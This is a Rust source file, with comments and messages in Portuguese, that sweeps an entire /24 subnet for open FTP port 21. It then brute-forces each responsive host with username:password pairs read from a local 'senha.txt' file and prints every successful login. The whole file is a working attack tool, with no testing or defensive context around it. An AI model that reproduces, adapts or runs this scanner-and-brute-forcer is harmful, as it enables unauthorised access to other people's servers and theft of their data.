use std::process::exit;
use std::fs::read_to_string;
use std::time::Duration;
use std::env;
use std::net::{ToSocketAddrs, TcpStream};
use std::thread;
use ftp::FtpStream;
use colored::*;

pub struct UserAndPass {
    pub user: String,
    pub pass: String,
}

impl UserAndPass {
    pub fn new(user: String, pass: String) -> UserAndPass {
        UserAndPass { user, pass }
    }
}

static mut HOSTS: Vec<String> = Vec::new();
static PORT: i32 = 21; // Porta FTP
static RANGE: i32 = 255; // Classe C

fn main() {
    if let Some(valor) = read_arquivo("senha.txt") {
        // Lógica no loop
        unsafe {
            let args: Vec<String> = env::args().collect();
            if args.len() != 2 {
                println!("Uso: ./code Ip");
                exit(0x232);
            }

            // Executar o código
            let host: Vec<&str> = args[1].as_str().split(".").collect();
            if host.len() != 4 {
                println!("Uso: ./code host Ip");
                exit(0xf32);
            }

            // Converter Vec<i32>
            let host_int: Vec<i32> = host
                .iter()
                .map(|&s| {
                    s.parse::<i32>().unwrap_or_else(|_| {
                        eprintln!("Host não existe");
                        exit(0xf21);
                    })
                })
                .collect();

            for cont in 0..RANGE + 1 {
                let host_ativo = format!("{}.{}.{}.{}", host_int[0], host_int[1], host_int[2], cont);

                if let Some(_) = check_host_port(host_ativo.to_string()) {
                    
                    HOSTS.push(host_ativo.to_string());
                } else {
                    print!("Porta 21 fechada: {}", host_ativo.red());
                    std::io::Write::flush(&mut std::io::stdout()).unwrap();
                    print!("\r");
                    continue;
                }
            }

            print!("\x1B[2J\x1B[1;1H");

            
            if HOSTS.is_empty() {
                println!("Nenhum host com a porta 21 aberta.");
                exit(2);
            }

            read_lines(valor);
        }
    } else {
        println!("Arquivo não encontrado");
        exit(1);
    }
}

fn read_arquivo(filename: &str) -> Option<String> {
    if let Ok(buffer_arq) = read_to_string(filename) {
        return Some(buffer_arq.trim().to_string());
    }
    None
}

fn check_host_port(host: String) -> Option<()> {
    let addr = format!("{}:{}", host, PORT);

    match TcpStream::connect_timeout(&addr.to_socket_addrs().unwrap().next().unwrap(), Duration::from_millis(100)) {
        Ok(_) => Some(()),
        Err(_) => None,
    }
}

fn brute_force(host: &str, login: &UserAndPass) {
    let mut ftp_stream = FtpStream::connect(format!("{}:{}", host, PORT));

    if let Ok(mut valor) = ftp_stream {
        if let Ok(_) = valor.login(&login.user, &login.pass) {
            println!(
                "Acesso aceito: {} > Usuário: {} Senha: {}",
                host.yellow(),
                &login.user.on_blue(),
                login.pass.green()
            );
            valor.quit();
        }
    }
}

fn read_lines(lines: String) {
    for linha in lines.lines() {
        let split_lines: Vec<&str> = linha.split(":").collect();
        if split_lines.len() < 2 {
            continue;
        } else if split_lines.len() == 2 {
            let user = split_lines[0];
            let pass = split_lines[1];
            let info = UserAndPass {
                user: user.to_string(),
                pass: pass.to_string(),
            };

            unsafe {
                for ip in &HOSTS {
                    print!(
                        "Host: {} Usuário: {} Senha: {} ",
                        ip, &info.user, &info.pass
                    );
                    thread::sleep(Duration::from_millis(50));
                    std::io::Write::flush(&mut std::io::stdout()).unwrap();
                    print!("\r");

                    brute_force(ip.as_str(), &info);
                }
            }
        }
    }
}
